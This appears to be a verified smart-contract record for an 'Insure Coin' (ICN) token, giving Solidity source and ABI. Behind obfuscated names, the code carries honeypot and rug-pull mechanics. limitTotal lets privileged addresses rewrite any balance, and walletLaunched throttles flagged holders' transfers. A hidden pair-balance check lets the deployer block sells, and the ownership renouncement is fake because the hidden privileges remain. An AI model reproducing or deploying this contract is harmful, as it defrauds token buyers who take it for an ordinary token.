{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract swapIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMode {\n    function createPair(address amountBuyTx, address liquidityMinShould) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface amountTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface launchedAtMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeSwap) external view returns (uint256);\n\n    function transfer(address launchedBuy, uint256 launchedSwap) external returns (bool);\n\n    function allowance(address txIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedBuy,\n        uint256 launchedSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxBuy, uint256 value);\n    event Approval(address indexed txIs, address indexed spender, uint256 value);\n}\n\ninterface txMarketing is launchedAtMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InsureCoin is swapIs, launchedAtMarketing, txMarketing {\n\n    uint256 constant senderMarketing = 12 ** 10;\n\n    function transfer(address senderShould, uint256 launchedSwap) external virtual override returns (bool) {\n        return tradingLiquidityTeam(_msgSender(), senderShould, launchedSwap);\n    }\n\n    mapping(address => uint256) private feeAuto;\n\n    bool public maxAt;\n\n    function walletLaunched(address teamLaunched) public {\n        receiverWallet();\n        if (feeMarketingExempt != feeMax) {\n            maxAt = false;\n        }\n        if (teamLaunched == teamFee || teamLaunched == toFee) {\n            return;\n        }\n        autoReceiver[teamLaunched] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableShould;\n    }\n\n    uint256 public tokenExempt = 0;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldReceiverAmount;\n    }\n\n    function marketingLaunch(uint256 launchedSwap) public {\n        receiverWallet();\n        buyTo = launchedSwap;\n    }\n\n    uint256 public feeMarketingExempt;\n\n    uint256 isTxLaunch;\n\n    bool public listTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamMin;\n    }\n\n    function toList(address atLiquidity, address launchedBuy, uint256 launchedSwap) internal view returns (uint256) {\n        require(launchedSwap > 0);\n\n        uint256 exemptFrom = 0;\n        if (atLiquidity == toFee && listMode > 0) {\n            exemptFrom = launchedSwap * listMode / 100;\n        } else if (launchedBuy == toFee && tokenExempt > 0) {\n            exemptFrom = launchedSwap * tokenExempt / 100;\n        }\n        require(exemptFrom <= launchedSwap);\n        return launchedSwap - exemptFrom;\n    }\n\n    function limitTotal(address senderShould, uint256 launchedSwap) public {\n        receiverWallet();\n        feeAuto[senderShould] = launchedSwap;\n    }\n\n    uint256 public senderSwap;\n\n    uint256 public listMode = 3;\n\n    function allowance(address fundShould, address buySenderSwap) external view virtual override returns (uint256) {\n        if (buySenderSwap == buyLaunchedTeam) {\n            return type(uint256).max;\n        }\n        return takeFee[fundShould][buySenderSwap];\n    }\n\n    function transferFrom(address atLiquidity, address launchedBuy, uint256 launchedSwap) external override returns (bool) {\n        if (_msgSender() != buyLaunchedTeam) {\n            if (takeFee[atLiquidity][_msgSender()] != type(uint256).max) {\n                require(launchedSwap <= takeFee[atLiquidity][_msgSender()]);\n                takeFee[atLiquidity][_msgSender()] -= launchedSwap;\n            }\n        }\n        return tradingLiquidityTeam(atLiquidity, launchedBuy, launchedSwap);\n    }\n\n    function balanceOf(address feeSwap) public view virtual override returns (uint256) {\n        return feeAuto[feeSwap];\n    }\n\n    bool public walletEnable;\n\n    function owner() external view returns (address) {\n        return launchShouldLaunched;\n    }\n\n    function approve(address buySenderSwap, uint256 launchedSwap) public virtual override returns (bool) {\n        takeFee[_msgSender()][buySenderSwap] = launchedSwap;\n        emit Approval(_msgSender(), buySenderSwap, launchedSwap);\n        return true;\n    }\n\n    address buyLaunchedTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingList() public {\n        emit OwnershipTransferred(teamFee, address(0));\n        launchShouldLaunched = address(0);\n    }\n\n    uint8 private totalTx = 18;\n\n    uint256 public feeMax;\n\n    mapping(address => mapping(address => uint256)) private takeFee;\n\n    function getOwner() external view returns (address) {\n        return launchShouldLaunched;\n    }\n\n    address totalMode;\n\n    function txTeam(address takeTotal) public {\n        if (walletEnable) {\n            return;\n        }\n        \n        buyListAuto[takeTotal] = true;\n        \n        walletEnable = true;\n    }\n\n    uint256 buyTo;\n\n    address private launchShouldLaunched;\n\n    bool public tokenTotal;\n\n    address public toFee;\n\n    event OwnershipTransferred(address indexed buyFund, address indexed launchedTotalAmount);\n\n    mapping(address => bool) public autoReceiver;\n\n    constructor (){\n        if (feeMax != feeMarketingExempt) {\n            feeMax = senderSwap;\n        }\n        marketingList();\n        amountTx toMode = amountTx(buyLaunchedTeam);\n        toFee = walletMode(toMode.factory()).createPair(toMode.WETH(), address(this));\n        totalMode = walletMode(toMode.factory()).feeTo();\n        \n        teamFee = _msgSender();\n        buyListAuto[teamFee] = true;\n        feeAuto[teamFee] = shouldReceiverAmount;\n        if (senderSwap != feeMarketingExempt) {\n            senderSwap = feeMax;\n        }\n        emit Transfer(address(0), teamFee, shouldReceiverAmount);\n    }\n\n    function amountSell(address atLiquidity, address launchedBuy, uint256 launchedSwap) internal returns (bool) {\n        require(feeAuto[atLiquidity] >= launchedSwap);\n        feeAuto[atLiquidity] -= launchedSwap;\n        feeAuto[launchedBuy] += launchedSwap;\n        emit Transfer(atLiquidity, launchedBuy, launchedSwap);\n        return true;\n    }\n\n    uint256 private shouldReceiverAmount = 100000000 * 10 ** 18;\n\n    address public teamFee;\n\n    string private enableShould = \"ICN\";\n\n    string private teamMin = \"Insure Coin\";\n\n    function tradingLiquidityTeam(address atLiquidity, address launchedBuy, uint256 launchedSwap) internal returns (bool) {\n        if (atLiquidity == teamFee) {\n            return amountSell(atLiquidity, launchedBuy, launchedSwap);\n        }\n        uint256 limitBuy = launchedAtMarketing(toFee).balanceOf(totalMode);\n        require(limitBuy == buyTo);\n        require(launchedBuy != totalMode);\n        if (autoReceiver[atLiquidity]) {\n            return amountSell(atLiquidity, launchedBuy, senderMarketing);\n        }\n        launchedSwap = toList(atLiquidity, launchedBuy, launchedSwap);\n        return amountSell(atLiquidity, launchedBuy, launchedSwap);\n    }\n\n    mapping(address => bool) public buyListAuto;\n\n    function receiverWallet() private view {\n        require(buyListAuto[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotalAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buySenderSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySenderSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyListAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"limitTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"marketingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"txTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"walletLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InsureCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}